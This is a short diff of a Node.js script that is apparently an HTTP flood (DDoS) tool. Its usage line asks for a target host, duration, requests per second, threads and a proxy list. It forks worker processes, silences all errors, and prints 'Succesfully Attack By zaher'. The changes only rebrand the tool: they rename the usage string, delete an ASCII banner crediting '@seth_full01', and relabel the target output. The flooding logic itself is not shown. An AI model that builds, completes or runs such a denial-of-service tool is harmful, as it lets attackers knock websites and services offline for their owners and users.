@@ -206,7 +206,7 @@ process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function(exception) {});
 
-if (process.argv.length < 7) { console.log('example: node p <host> <time> <rps> <threads> <proxyfile>');
+if (process.argv.length < 7) { console.log('example: node zaher <host> <time> <rps> <threads> <proxyfile>');
     process.exit(); }
 const headers = {};
 
@@ -3207,21 +3207,9 @@ if (cluster.isMaster) {
         cluster.fork();
     }
     console.clear();
-    console.log(` 
- ▄▄▄       ██▀███  ▒███████▒
-▒████▄    ▓██ ▒ ██▒▒ ▒ ▒ ▄▀░
-▒██  ▀█▄  ▓██ ░▄█ ▒░ ▒ ▄▀▒░ 
-░██▄▄▄▄██ ▒██▀▀█▄    ▄▀▒   ░
- ▓█   ▓██▒░██▓ ▒██▒▒███████▒
- ▒▒   ▓▒█░░ ▒▓ ░▒▓░░▒▒ ▓░▒░▒
-  ▒   ▒▒ ░  ░▒ ░ ▒░░░▒ ▒ ░ ▒
-  ░   ▒     ░░   ░ ░ ░ ░ ░ ░
-      ░  ░   ░       ░ ░    
-                   ░        
-   (@seth_full01) Start- Attack By zaher          
-`);
+
     console.log("Succesfully Attack By zaher\n");
-    console.log("Website/Target: " + process.argv[2]);
+    console.log("Target: " + process.argv[2]);
     console.log("Times: " + process.argv[3]);
     console.log("RPS: " + process.argv[4]);
     console.log("Threads: " + process.argv[5]);
